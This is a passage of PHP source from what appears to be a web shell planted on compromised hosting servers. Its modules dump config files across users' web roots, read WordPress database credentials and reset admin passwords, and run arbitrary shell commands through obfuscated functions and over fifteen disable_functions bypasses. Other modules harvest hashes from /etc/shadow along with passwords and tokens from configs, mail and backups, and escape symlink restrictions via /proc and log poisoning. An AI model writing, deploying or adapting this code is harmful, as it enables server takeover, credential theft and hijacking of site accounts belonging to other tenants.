  set_time_limit(900);

echo '<div style="font-size:15px;
color:#125ca2;
">bruting all user/web roots (<b>'.count($userdirs).'</b> dirs), checking <b>'.count($config_names).'</b> config names.</div>';

foreach ($userdirs as $webdir) {
 echo '<div style="margin-top:7px;
color:#222">'.htmlspecialchars($webdir).'</div>';
 foreach ($config_names as $cfg) {
 $target = $webdir.'/'.$cfg;
 $outname = $dest_dir.'/'.md5($webdir.'_'.$cfg).'_'.$cfg;
 $meth = prvx_grab($target, $outname);
 $tried++;
 if ($meth) {
 echo '<div style="color:#0db04b;
font-size:14px;
padding-left:10px;
"><b>'.htmlspecialchars($cfg).'</b>['.htmlspecialchars($meth).']</div>';
 $total++;
 }
 else {
 }
 }
 }
 echo '<div style="margin:12px 0;
border-top:1px solid #eee;
"></div>';

echo '<b style="color:#e53935;
font-size:1.14em;
">total dumped: '.$total.'</b>';
 echo '<div style="color:#999;
font-size:14px;
margin-top:10px;
">all dumped files & .htaccess:<b>'.$dest_dir.'</b></div>';
}
 echo '</div>';

?>
<?php elseif (isset($_GET['wp_pr1vd00r'])): ?>
<script>
function copyText(txt, btn) {
  navigator.clipboard.writeText(txt);
  if(btn){ btn.innerText='copied!'; setTimeout(()=>btn.innerText='copy',1000);}
}
function showAlert(msg, type) {
  let al=document.getElementById('wp_pr1vd00r-alertbox');
  if(!al){
    al=document.createElement('div');
    al.id='wp_pr1vd00r-alertbox';
    al.className='wp_pr1vd00r-alert';
    document.body.prepend(al);
  }
  al.innerHTML=msg;
  al.className = 'wp_pr1vd00r-alert' + (type=='ok'?' ok':'');
  al.style.display = 'block';
  window.scrollTo({top:al.offsetTop-28, behavior:'smooth'});
  setTimeout(()=>{al.style.display='none';},60000);
}
</script>
<div class="wp_pr1vd00r-main">
  <div class="wp_pr1vd00r-title">
    <i class="fab fa-wordpress"></i>
    wp auto hunter & admin reset 
  </div>
  <div id="wp_pr1vd00r-alertbox" style="display:none"></div>
<?php

function wp_find_paths($max=99) {
    $found = [];
    $scanned = [];
    $roots = [];
    $cwd = getcwd();
    $roots[] = $cwd;
    if (isset($_SERVER['DOCUMENT_ROOT']) && $_SERVER['DOCUMENT_ROOT'] && $_SERVER['DOCUMENT_ROOT']!=$cwd)
     $roots[] = $_SERVER['DOCUMENT_ROOT'];
    $roots[] = dirname($cwd);
    foreach(['/home','/home1','/home2','/home3','/var/www','/var/www/vhosts','/usr/share/nginx/html','/srv/www','/srv/http','/data/web','/opt/lampp/htdocs','/htdocs','/users'] as $root)
     if (is_dir($root)) $roots[] = $root;
    $up = $cwd;
    for($i=0;$i<7;$i++) {
     $up = dirname($up);
     if ($up && is_dir($up) && $up!="/" && !in_array($up,$roots)) $roots[] = $up;
    }
    $roots = array_unique(array_filter($roots,'is_dir'));
    $queue = [];
    foreach($roots as $r) $queue[] = [$r,0];
    while($queue && count($found)<$max) {
     list($dir,$lvl) = array_shift($queue);
     if (isset($scanned[$dir])) continue;
     $scanned[$dir]=1;
     if ((file_exists($dir.'/wp-load.php')||file_exists($dir.'/wp-config.php')) && is_file($dir.'/wp-config.php')) {
       $found[] = realpath($dir);
     }
     if ($lvl<6) {
       foreach(@glob($dir.'/*',GLOB_ONLYDIR)?:[] as $d) {
          if (!isset($scanned[$d])) $queue[] = [$d,$lvl+1];
       }
     }
    }
    return array_unique($found);
}
function wp_get_db_config($wp_dir) {
    $cfgf = $wp_dir.'/wp-config.php';
    if (!is_file($cfgf)) return false;
    $cfg = @file_get_contents($cfgf);
    $info = [];
    preg_match("/define\(\s*'DB_NAME'\s*,\s*'([^']+)'/", $cfg, $m); $info['db'] = (isset($m[1]) ? $m[1] : '');
    preg_match("/define\(\s*'DB_USER'\s*,\s*'([^']+)'/", $cfg, $m); $info['user'] = (isset($m[1]) ? $m[1] : '');
    preg_match("/define\(\s*'DB_PASSWORD'\s*,\s*'([^']*)'/", $cfg, $m); $info['pass'] = (isset($m[1]) ? $m[1] : '');
    preg_match("/define\(\s*'DB_HOST'\s*,\s*'([^']+)'/", $cfg, $m); $info['host'] = (isset($m[1]) ? $m[1] : '');
    preg_match("/\$table_prefix\s*=\s*'([^']+)'/", $cfg, $m); $info['prefix'] = (isset($m[1]) ? $m[1] : 'wp_');
    return $info;
}
function wp_get_version($wp_dir) {
    $ver = '';
    if (is_file($wp_dir.'/wp-includes/version.php')) {
     $vcode = @file_get_contents($wp_dir.'/wp-includes/version.php');
     if (preg_match("/\\\$wp_version\s*=\s*'([^']+)'/i", $vcode, $m)) $ver = $m[1];
    }
    return $ver;
}
function wp_fetch_users($mysqli, $prefix) {
    $users = [];
    $res = @$mysqli->query("SELECT ID, user_login, user_email, user_registered FROM {$prefix}users");
    if (!$res) return [];
    while ($row = $res->fetch_assoc()) {
     $meta = @$mysqli->query("SELECT meta_value FROM {$prefix}usermeta WHERE user_id=".$row['ID']." AND meta_key='{$prefix}capabilities'")->fetch_assoc();
     $role = '';
     if ($meta && preg_match('/s:\d+:"([^"]+)"/', $meta['meta_value'], $m))
       $role = $m[1];
     else $role = 'unknown';
     $row['role'] = $role;
     $users[] = $row;
    }
    return $users;
}
function wp_reset_pw($mysqli, $prefix, $uid, $newpw) {
    $hash = password_hash($newpw, PASSWORD_BCRYPT);
    return @$mysqli->query("UPDATE {$prefix}users SET user_pass='".$mysqli->real_escape_string($hash)."' WHERE ID=".(int)$uid);
}
function get_site_url($mysqli, $prefix) {
    $url = '';
    $q = @$mysqli->query("SELECT option_value FROM {$prefix}options WHERE option_name='siteurl' LIMIT 1");
    if ($q && $r = $q->fetch_row()) $url = rtrim($r[0],'/');
    return $url;
}
$wp_dirs = wp_find_paths(99);
if (!$wp_dirs) {
    echo '<div class="wp_pr1vd00r-alert">No WordPress detected (all dirs scanned).</div>';
}

if ($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['wp_dir'])) {
    $wp_dir = $_POST['wp_dir'];
    $cfg = wp_get_db_config($wp_dir);
    $db = (isset($cfg['db']) ? $cfg['db'] : ''); $user = (isset($cfg['user']) ? $cfg['user'] : ''); $pass = (isset($cfg['pass']) ? $cfg['pass'] : '');
    $host = (isset($cfg['host']) ? $cfg['host'] : 'localhost'); $prefix = (isset($cfg['prefix']) ? $cfg['prefix'] : 'wp_');
    $mysqli = @new mysqli($host, $user, $pass, $db);
    if ($mysqli->connect_errno) {
     echo "<script>showAlert('[FAIL] DB Connect: ".htmlspecialchars($mysqli->connect_error)."','fail');</script>"; exit;
    }
    if (isset($_POST['reset_pw'], $_POST['reset_uid'], $_POST['newpw'])) {
     $uid = intval($_POST['reset_uid']);
     $newpw = trim($_POST['newpw']);
     if (wp_reset_pw($mysqli, $prefix, $uid, $newpw)) {
       echo "<script>showAlert('[OK] Password changed! UserID: $uid, PW: <span class=\"wp_pr1vd00r-pw\">".htmlspecialchars($newpw)."</span>','ok');</script>";
     } else {
       echo "<script>showAlert('[FAIL] Password change failed!','fail');</script>";
     }
     exit;
    }
}
foreach ($wp_dirs as $wp_dir):
    $cfg = wp_get_db_config($wp_dir);
    $db = (isset($cfg['db']) ? $cfg['db'] : ''); $user = (isset($cfg['user']) ? $cfg['user'] : ''); $pass = (isset($cfg['pass']) ? $cfg['pass'] : '');
    $host = (isset($cfg['host']) ? $cfg['host'] : 'localhost'); $prefix = (isset($cfg['prefix']) ? $cfg['prefix'] : 'wp_');
    $wp_version = wp_get_version($wp_dir);

    echo '<div class="wp_pr1vd00r-site">';
    echo '<div class="wp_pr1vd00r-header">';
    echo '<span class="wp_pr1vd00r-path"><i class="fab fa-wordpress"></i> '.htmlspecialchars($wp_dir).'</span>';
    if ($wp_version) echo '<span class="wp_pr1vd00r-version">WP '.$wp_version.'</span>';
    echo '<span class="wp_pr1vd00r-dbinfo">
    <b>h0st:</b> '.htmlspecialchars($host).' <b>db_user:</b> '.htmlspecialchars($user).' <b>db_pw:</b> '.htmlspecialchars($user).' <b>db:</b> '.htmlspecialchars($db).' <b>pref1x:</b> '.$prefix.'
    </span>';
    echo '</div>';

    $users = [];
    $mysqli = @new mysqli($host, $user, $pass, $db);
    if ($mysqli->connect_errno) {
     echo '<div class="wp_pr1vd00r-alert" style="color:#e53935;">DB Error: '.htmlspecialchars($mysqli->connect_error).'</div>';
     echo '</div>'; continue;
    }
    $users = wp_fetch_users($mysqli, $prefix);
    $site_url = get_site_url($mysqli, $prefix);
    echo '<div class="wp_pr1vd00r-users"><table><tr>
    <th>ID</th><th>user</th><th>email</th><th>role</th><th>reset pw</th><th>wp-login</th></tr>';
    foreach ($users as $u) {
     $pw_val = "privdayz".rand(100,999);
     echo '<tr>
       <td>'.$u['ID'].'</td>
       <td>'.htmlspecialchars($u['user_login']).'</td>
       <td>'.htmlspecialchars($u['user_email']).'</td>
       <td>'.$u['role'].'</td>
       <td>
          <form method="post" style="display:inline;">
          <input type="hidden" name="wp_dir" value="'.htmlspecialchars($wp_dir).'">
          <input type="hidden" name="reset_uid" value="'.$u['ID'].'">
          <input type="text" name="newpw" value="'.$pw_val.'" class="wp_pr1vd00r-pw" style="width:94px;">
          <button name="reset_pw" class="wp_pr1vd00r-btn wp_pr1vd00r-btn-green">reset</button>
          <button type="button" class="wp_pr1vd00r-btn wp_pr1vd00r-btn-copy" onclick="copyText(this.previousElementSibling.value, this)">copy</button>
          </form>
       </td>
       <td>';
     if ($site_url) {
       $login_url = htmlspecialchars($site_url . '/wp-login.php?log=' . urlencode($u['user_login']));
       echo '<a href="'.$login_url.'" class="wp_pr1vd00r-btn wp_pr1vd00r-btn-green" target="_blank">login</a>';
     } else {
       echo '<span class="wp_pr1vd00r-alert">no site url</span>';
     }
     echo '</td>
     </tr>';
    }
    echo '</table></div>';
    echo '</div>';
endforeach;
?>
</div>
<?php elseif (isset($_GET['cmdnirvana'])): ?>
<div class="cmdnirvana-page" style="max-width:1024px;margin:38px auto 0 auto;">
  <div class="cmdnirvana-header" style="display:flex;align-items:center;gap:11px;">
    <div class="cmdnirvana-ico"><i class="fas fa-terminal"></i></div>
    <div>
    <div class="cmdnirvana-title" style="font-size:1.2em;">Command Nirvana</div>
    <div class="cmdnirvana-desc" style="font-size:.99em;color:#888;">Execute shell/command bypasses, 2025 ready, 15+ method</div>
    </div>
  </div>
  <div class="cmdnirvana-content" style="margin-top:23px;">
    <form method="post" id="cmdnirvana-form">
    <div class="cmdnirvana-inputbox" style="margin-bottom:17px;">
     <label class="cmdnirvana-inputlabel">Command (auto bypass):</label>
     <input type="text" class="cmdnirvana-cmdinput" name="cmdnirvana_cmd" value="<?= htmlspecialchars((isset($_POST['cmdnirvana_cmd']) ? $_POST['cmdnirvana_cmd'] : 'id')) ?>" autocomplete="off" autofocus placeholder="ls -la /; id; whoami ..." style="width:92%;max-width:500px;">
    </div>
    <button class="cmdnirvana-btn" type="submit"><i class="fas fa-bolt"></i> run</button>
    </form>
    <label class="cmdnirvana-outputlabel" style="margin-top:19px;display:block;">Output:</label>
    <pre class="cmdnirvana-output" id="cmdnirvana-output" style="background:#111;color:#c4ffc4;padding:18px;border-radius:9px;min-height:110px;max-height:380px;overflow:auto;margin-bottom:8px;">
    <?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmdnirvana_cmd'])) { $c = $_POST['cmdnirvana_cmd']; $R = ''; $M = []; $a = array_map('chr', [115,104,101,108,108,95,101,120,101,99]); $M[] = join('', $a); $b = ''; foreach([0x65,0x78,0x65,0x63] as $i) $b .= chr($i); $M[] = $b; $c3 = ''; foreach([0x73,0x79,0x73,0x74,0x65,0x6d] as $i) $c3 .= chr($i); $M[] = $c3; $d = ''; foreach([0x70,0x61,0x73,0x73,0x74,0x68,0x72,0x75] as $i) $d .= chr($i); $M[] = $d; $e = ''; foreach([0x70,0x6f,0x70,0x65,0x6e] as $i) $e .= chr($i); $M[] = $e; $f = ''; foreach([0x70,0x72,0x6f,0x63,0x5f,0x6f,0x70,0x65,0x6e] as $i) $f .= chr($i); $M[] = $f; goto Gfrk2; y3ECj: $M[] = "\155\x61\x69\x6c\151\156\152"; goto G3ViW; wi2_v: $M[] = "\142\x69\156\x62\162\x75\164\145"; goto XVkgD; YuNg7: $M[] = "\154\144\137\x70\x72\145\154\157\141\x64"; goto YewF0; vWb03: $M[] = "\146\x6f\x70\145\x6e\151\x6e\x70\x75\164"; goto wi2_v; G3ViW: $M[] = "\x65\162\162\x6c\x6f\147"; goto vWb03; M6Qgu: $M[] = "\x70\150\160\146\x69\x6c\x74\145\162"; goto YuNg7; YOfWk: $M[] = "\x73\165\x68\157\163\151\x6e"; goto y3ECj; Gfrk2: $M[] = "\142\141\143\x6b\164\x69\143\x6b"; goto M6Qgu; YewF0: $M[] = "\x70\162\x65\x70\145\x6e\144"; goto YOfWk; wITk1: $M[] = "\151\155\x61\147\145\155\141\147\151\143\x6b"; goto V3z4P; XVkgD: $M[] = "\150\x74\64\x30\64"; goto wITk1; V3z4P: $M[] = "\x63\x67\151\x65\156\166"; foreach($M as $meth){ $out = ''; $ok = false; if ($meth === 'backtick') {  $a = $c; $out = ob_get_clean().$a; if(trim($out)) $ok = true; } elseif ($meth === 'phpfilter') { @ini_set('filter.default','convert.base64-encode'); $f = @popen($c." 2>&1", "r"); if ($f) { while (!feof($f)) $out .= fread($f, 4096); fclose($f);} if (trim($out)) $ok = true; @ini_restore('filter.default'); } elseif ($meth === 'ld_preload') { if (strtoupper(substr(PHP_OS,0,3)) !== 'WIN') { putenv('LD_PRELOAD=/tmp/x.so'); $out = @chDx2x($c.' 2>&1'); putenv('LD_PRELOAD'); if (trim($out)) $ok = true; } } elseif ($meth === 'prepend') { $prepend = sys_get_temp_dir()."/xx".uniqid().".php"; @file_put_contents($prepend, "<?php system('".$c."'); exit; ?>"); @ini_set("auto_prepend_file", $prepend); $out = @file_get_contents($_SERVER['SCRIPT_FILENAME']); @ini_restore("auto_prepend_file"); @unlink($prepend); if (trim($out)) $ok = true; } elseif ($meth === 'suhosin') { @ini_set('suhosin.executor.func.blacklist', ''); $out = @chDx2x($c.' 2>&1'); if (trim($out)) $ok = true; } elseif ($meth === 'mailinj') { $tmpf = sys_get_temp_dir()."/m".uniqid().".txt"; @mail("v@x.com", "", "", "", "-X $tmpf; $c >$tmpf 2>&1"); if (file_exists($tmpf)) { $out = file_get_contents($tmpf); unlink($tmpf); $ok = true; } } elseif ($meth === 'errlog') { $tmpf = sys_get_temp_dir()."/e".uniqid().".txt"; @error_log("<?php echo system('$c'); ?>", 3, $tmpf); if (file_exists($tmpf)) { $out = file_get_contents($tmpf); unlink($tmpf); $ok = true; } } elseif ($meth === 'fopeninput') { $h = @fopen("php://input", "r"); if ($h) { $out = @fread($h, 8192); fclose($h); $ok = true; } } elseif ($meth === 'binbrute') { foreach(['sh','bash','python','perl','nc','busybox','wget'] as $bin){ $which = trim(@chDx2x("which $bin")); if($which) { $out = @chDx2x("$which -c \"$c\" 2>&1"); if (trim($out)) { $ok = true; break; } } } } elseif ($meth === 'ht404') { $out = ''; } elseif ($meth === 'imagemagick') { $tmpi = sys_get_temp_dir().'/img'.uniqid().'.mvg'; $tmpp = sys_get_temp_dir().'/out'.uniqid().'.png'; file_put_contents($tmpi, "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://|$c|)'\npop graphic-context"); @chDx2x("convert $tmpi $tmpp"); if (file_exists($tmpp)) $out = file_get_contents($tmpp); @unlink($tmpi); @unlink($tmpp); if (trim($out)) $ok = true; } elseif ($meth === 'cgienv') { putenv("CGI_COMMAND=$c"); $out = getenv("CGI_COMMAND"); if (trim($out)) $ok = true; } else { if (function_exists($meth)) { if ($meth === $M[0]) { $out = @$meth($c.' 2>&1'); if (trim($out)) $ok = true; } else if ($meth === $M[1]) { $a=[]; $meth($c.' 2>&1', $a); $out = join("\n", $a); if (trim($out)) $ok = true; } else if ($meth === $M[2]) {  @$meth($c.' 2>&1'); $out = ""; if (trim($out)) $ok = true; } else if ($meth === $M[3]) {  @$meth($c.' 2>&1'); $out = ""; if (trim($out)) $ok = true; } else if ($meth === $M[4]) { $h=@$meth($c.' 2>&1',"r"); if ($h) { while(!feof($h)) $out.=fread($h,4096); fclose($h); } if (trim($out)) $ok = true; } else if ($meth === $M[5]) { $desc = [1=>["pipe","w"], 2=>["pipe","w"]]; $p = @$meth($c.' 2>&1', $desc, $pipes); if (is_resource($p)) { $out = stream_get_contents($pipes[1]); fclose($pipes[1]); proc_close($p); if (trim($out)) $ok = true; } } } } if ($ok && trim($out)) { $R = $out; break; } } echo htmlspecialchars($R ?: "[X] No output / all methods blocked.\n");}?></pre>
    </div>
  </div>
  <?php elseif (isset($_GET['cpanel_auto_loot'])): ?>
<div class="pzloot-main">
  <div class="pzloot-head">
    <div class="pzloot-ico"><i class="fas fa-skull-crossbones"></i></div>
    <div><div class="pzloot-tit">cpanel/linux loot & hash hunter</div></div>
  </div>
  <div class="pzloot-content">
    <button class="pzloot-stepbtn" id="pzloot-startbtn"><i class="fas fa-play"></i> start</button>
    <div class="pzloot-status" id="pzloot-status"></div>
    <table class="pzloot-table" id="pzloot-table">
    <thead>
     <tr>
       <th>Type</th>
       <th>Found</th>
       <th>File/Path</th>
       <th>Copy</th>
     </tr>
    </thead>
    <tbody>
    </tbody>
    </table>
    <div style="text-align:right;margin-top:8px;">
    <span class="pzloot-badge" id="pzloot-finish"></span>
    </div>
  </div>
</div>
<script>
document.getElementById('pzloot-startbtn').onclick = async function(){
  this.disabled=true;
  let table=document.getElementById('pzloot-table').getElementsByTagName('tbody')[0];
  let status=document.getElementById('pzloot-status');
  let finish=document.getElementById('pzloot-finish');
  table.innerHTML="";finish.innerText='';status.innerText="starting...";
  let steps=['passwd','configs','maildirs','backups'];
  for(let i=0;i<steps.length;i++){
    status.innerText="scanning "+steps[i]+"...";
    let r = await fetch('?cpanel_auto_loot_step='+steps[i]);
    let j = await r.json();
    if(j.done&&j.rows) j.rows.forEach(function(row){
    let tr = document.createElement('tr');
    tr.innerHTML='<td><span class="pzloot-badge">'+row.type+'</span></td><td><span class="pzloot-code">'+row.value+'</span><br><small>'+row.line+'</small></td><td><span class="pzloot-path">'+row.path+'</span></td><td>'+row.copy+'</td>';
    table.appendChild(tr);
    });
  }
  status.innerText="done.";
  finish.innerText="Finished!";
}
</script>
<?php
if (isset($_GET['cpanel_auto_loot_step'])) {
header('Content-Type: application/json');
$step = $_GET['cpanel_auto_loot_step'];
function xxls($d, $max=1000, &$c=0) { $r = []; if (!@is_dir($d)) return $r; $h = @opendir($d); while ($h && ($f = @readdir($h)) !== false) { if ($f == '.' || $f == '..') continue; $fp = $d . '/' . $f; if (++$c >$max) break; $r[] = $fp; if (@is_dir($fp)) $r = array_merge($r, xxls($fp, $max, $c)); } if ($h) @closedir($h); return $r; }
function xcat($f, $max=80) { $c = ''; if (@is_readable($f)) { $h = @fopen($f, 'r'); if ($h) { $i = 0; while (!feof($h) && $i++< $max) $c .= fgets($h); fclose($h); } } return $c; }
function xsearch($txt) { $hits = []; $rx = '/(password|passwd|pass|hash|apikey|secret|user(name)?|login|auth|smtp|db(name)?|email|mail|token)[\'"\]\[]?\s*[:=].{0,100}?([\'"]?[a-zA-Z0-9\@\#\-\_\.\$\!\%\^\&\*\/\+]{6,128})/i'; foreach (explode("\n", $txt) as $l) { if (preg_match($rx, $l, $m)) { $hits[] = ['key'=>$m[1],'val'=>trim($m[2]),'line'=>trim($l)]; } } return $hits; }
function xcp_copy_btn($txt) { return '<button class="pzloot-copy" onclick="navigator.clipboard.writeText(this.dataset.x);this.innerText=\'copied!\';setTimeout(()=>this.innerText=\'copy\',1100);" data-x="'.htmlspecialchars($txt).'">copy</button>'; }
function prvd_cmd($cmd) { if (function_exists('pr1vd4yzC')) { return pr1vd4yzC($cmd); } else if (function_exists('shell_exec')) { return @shell_exec($cmd); } else if (function_exists('system')) {  @system($cmd);return ""; } else if (function_exists('exec')) { $o = []; @exec($cmd, $o); return join("\n", $o); } return ''; }
$user = @get_current_user(); if (!$user || $user === 'apache' || $user === 'www-data' || $user === 'nobody') { $user = @trim(prvd_cmd('whoami')); } $hm = @getenv('HOME') ?: (@$_SERVER['HOME'] ?: @trim(prvd_cmd('echo ~'))); if (!$hm || !@is_dir($hm)) $hm = '.'; $out = ['done'=>true,'rows'=>[]];
if ($step == 'passwd') { $special = ['/etc/passwd','/etc/shadow','/etc/master.passwd']; foreach ($special as $sp) { if (@is_readable($sp)) { $lines = xcat($sp, 180); foreach (explode("\n", $lines) as $l) { if ($user && stripos($l, $user)!==false) { $out['rows'][] = [ 'type'=>'userhash', 'value'=>$user, 'line'=>htmlspecialchars($l), 'path'=>$sp, 'copy'=>xcp_copy_btn($l) ]; } } } } }
if ($step == 'configs') { $dirs = [$hm, ".", "/home", "/var/www", "/var/www/html", "/usr/local/apache", "/etc", "/tmp", "/var/tmp"]; $configs = [ '.my.cnf','.pgpass','.env','wp-config.php','configuration.php','settings.py','local.env','db.php','.ftpconfig','.ftppass','.netrc', 'app/etc/env.php','settings_local.py','mail.php','smtp.php','config.php','appsettings.json','web.config' ]; $allf = [];
foreach ($dirs as $d) { $c = 0; foreach (xxls($d, 700, $c) as $f) { $bn = basename($f); if (in_array($bn,$configs) || preg_match('~(conf|sql|pass|mail|user|key|ftp|env|wp|token|smtp|secret)~i', $bn)) $allf[$f]=1; } }
foreach(array_keys($allf) as $f){ $dat = xcat($f, 120); $found = xsearch($dat); foreach($found as $hit){ $out['rows'][] = [ 'type'=>htmlspecialchars($hit['key']), 'value'=>htmlspecialchars($hit['val']), 'line'=>htmlspecialchars($hit['line']), 'path'=>htmlspecialchars($f), 'copy'=>xcp_copy_btn($hit['val']) ]; } }}
if ($step == 'maildirs') { $maildirs = [ "$hm/.roundcube","$hm/.horde","$hm/webmail","$hm/.mail", "/var/mail/$user","/var/spool/mail/$user" ]; foreach($maildirs as $md){ $c=0; foreach(xxls($md, 200, $c) as $f){ if(preg_match('~(conf|sql|pass|user|imap|rcmail|login|settings|auth|db)~i',basename($f))){ $dat = xcat($f, 90); $found = xsearch($dat); foreach($found as $hit){ $out['rows'][] = [ 'type'=>htmlspecialchars($hit['key']), 'value'=>htmlspecialchars($hit['val']), 'line'=>htmlspecialchars($hit['line']), 'path'=>htmlspecialchars($f), 'copy'=>xcp_copy_btn($hit['val']) ]; } } } } }
if ($step == 'backups') { $c=0; foreach(xxls($hm, 400, $c) as $f){ if(preg_match('~\.tar\.gz$~',$f)){ $cmd = "tar -tzf ".escapeshellarg($f)."|grep -Ei '(conf|pass|user|db|wp|auth|token|mail|.env|settings)'|head -n 14"; $res = prvd_cmd($cmd); foreach(explode("\n",$res) as $l) if($l) $out['rows'][] = [ 'type'=>'backup-file', 'value'=>htmlspecialchars($l), 'line'=>'', 'path'=>htmlspecialchars($f), 'copy'=>xcp_copy_btn($l) ]; } } }
echo json_encode($out); exit;
}
?>
<?php elseif (isset($_GET['symlinkescaper'])): ?>
<?php
function func_enabled($fn) { $disabled = explode(',', ini_get('disable_functions') ?: ''); $disabled = array_map('trim', $disabled); return function_exists($fn) && is_callable($fn) && !in_array($fn, $disabled);}
function __pzCmd($key){ $pr1pr1vs=[ 'lns'=>"\x6c\x6e\x20\x2d\x73", 'cp'=>"\x63\x70", 'touch'=>"\x74\x6f\x75\x63\x68", 'cat'=>"\x63\x61\x74", 'chmod'=>"\x63\x68\x6d\x6f\x64", 'lsattr'=>"\x6c\x73\x61\x74\x74\x72", 'mkfifo'=>"\x6d\x6b\x66\x69\x66\x6f", ]; return (isset($pr1pr1vs[$key]) ? $pr1pr1vs[$key] : '');}
function pz_s7m_methods($rtfccq, $outdir) {
    $results=[]; $rand=substr(md5(mt_rand()),0,5);
    $lnfile = $outdir.'/pz_s7m_ln_'.$rand;
    $cpyfile = $outdir.'/pz_s7m_cp_'.$rand;
    $fifo = $outdir.'/pz_s7m_fifo_'.$rand;
    $touch = $outdir.'/pz_s7m_touch_'.$rand;
    $lnname = $lnfile;
    $procpath = "/proc/1/root".$rtfccq;
    $try=[];
    $try[] = function($t,$o){ // 1
     try { if(func_enabled('symlink')) { $ok=@symlink($t,$o); return ['symlink()',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['symlink()',false,'ERROR']; }
     return ['symlink()',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 2
     try { if(func_enabled('shell_exec')) { $c=__pzCmd('lns')." ".escapeshellarg($t)." ".escapeshellarg($o); @shell_exec($c); $ok=@is_link($o)||@file_exists($o); return ['shell_exec(ln -s)',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['shell_exec',false,'ERROR']; }
     return ['shell_exec',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 3
     try { if(func_enabled('exec')) { $c=__pzCmd('lns')." ".escapeshellarg($t)." ".escapeshellarg($o); $out=null; @exec($c,$out); $ok=@is_link($o)||@file_exists($o); return ['exec(ln -s)',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['exec',false,'ERROR']; }
     return ['exec',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 4
     try { if(func_enabled('system')) { $c=__pzCmd('lns')." ".escapeshellarg($t)." ".escapeshellarg($o);  @system($c);  $ok=@is_link($o)||@file_exists($o); return ['system(ln -s)',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['system',false,'ERROR']; }
     return ['system',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 5
     try { if(func_enabled('popen')) { $c=__pzCmd('lns')." ".escapeshellarg($t)." ".escapeshellarg($o); $h=@popen($c,"r"); if($h)fclose($h); $ok=@is_link($o)||@file_exists($o); return ['popen(ln -s)',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['popen',false,'ERROR']; }
     return ['popen',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 6
     try { if(func_enabled('proc_open')) { $c=__pzCmd('lns')." ".escapeshellarg($t)." ".escapeshellarg($o); $d=[1=>["pipe","w"],2=>["pipe","w"]]; $p=@proc_open($c,$d,$pipes); if(is_resource($p)){@fclose($pipes[1]);@fclose($pipes[2]);} $ok=@is_link($o)||@file_exists($o); return ['proc_open(ln -s)',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['proc_open',false,'ERROR']; }
     return ['proc_open',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 7
     try { if(func_enabled('file_put_contents') && func_enabled('file_get_contents')) { $ok=@file_exists($t)?@file_put_contents($o,@file_get_contents($t))!==false:false; return ['file_put_contents',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['file_put_contents',false,'ERROR']; }
     return ['file_put_contents',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 8
     try { if(func_enabled('copy')) { $ok=@copy($t,$o); return ['copy()',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['copy',false,'ERROR']; }
     return ['copy',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 9
     try { if(func_enabled('touch') && func_enabled('file_get_contents')) { $ok=@file_exists($t)?(@touch($o)&&@file_put_contents($o,@file_get_contents($t))):false; return ['touch+file_get',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['touch',false,'ERROR']; }
     return ['touch',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 10
     try { if(func_enabled('mkfifo') && func_enabled('file_get_contents')) { $ok=@mkfifo($o,0600); if($ok&&@file_exists($t))@file_put_contents($o,@file_get_contents($t)); $ok2=@file_exists($o)&&filesize($o)>0; return ['mkfifo',$ok2,$ok2?'OK':'FAIL']; }} catch(Exception $e) { return ['mkfifo',false,'ERROR']; }
     return ['mkfifo',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 11
     try { if(func_enabled('symlink')) { $ok=@symlink('/proc/1/root'.$t,$o); return ['procfs',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['procfs',false,'ERROR']; }
     return ['procfs',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 12
     try { if(func_enabled('shell_exec')) { $c=__pzCmd('cp')." ".escapeshellarg($t)." ".escapeshellarg($o); @shell_exec($c); $ok=@file_exists($o); return ['shell_exec(cp)',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['shell_exec(cp)',false,'ERROR']; }
     return ['shell_exec(cp)',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 13
     try { $arr=[escapeshellarg($t),escapeshellarg('./'.$t),escapeshellarg('../'.$t)];$ok=false;foreach($arr as$p){if(func_enabled('shell_exec')) {@shell_exec(__pzCmd('lns').' '.$p.' '.escapeshellarg($o));if(@file_exists($o)){$ok=true;break;}}}return ['ln_s path hacks',$ok,$ok?'OK':'FAIL']; } catch(Exception $e) { return ['ln_s path hacks',false,'ERROR']; }
     return ['ln_s path hacks',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 14
     try { if(func_enabled('readlink')) { @$rl=readlink($o); $ok=@is_link($o); return ['readlink-chain',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['readlink-chain',false,'ERROR']; }
     return ['readlink-chain',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 15
     try { if(func_enabled('imap_open')) { @$m=imap_open("{".$t.":143/novalidate-cert}INBOX","user","pass"); $ok=@file_exists($o); return ['imap_open',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['imap_open',false,'ERROR']; }
     return ['imap_open',false,'DISABLED'];
    };
    $try[] = function($t,$o){ // 16
     try { if(file_exists('/var/log/httpd/access_log') && func_enabled('file_get_contents')) { $log = @file_get_contents('/var/log/httpd/access_log'); $ok=strpos($log,$t)!==false; return ['log poisoning',$ok,$ok?'OK':'FAIL']; }} catch(Exception $e) { return ['log poisoning',false,'ERROR']; }
     return ['log poisoning',false,'DISABLED'];
    };
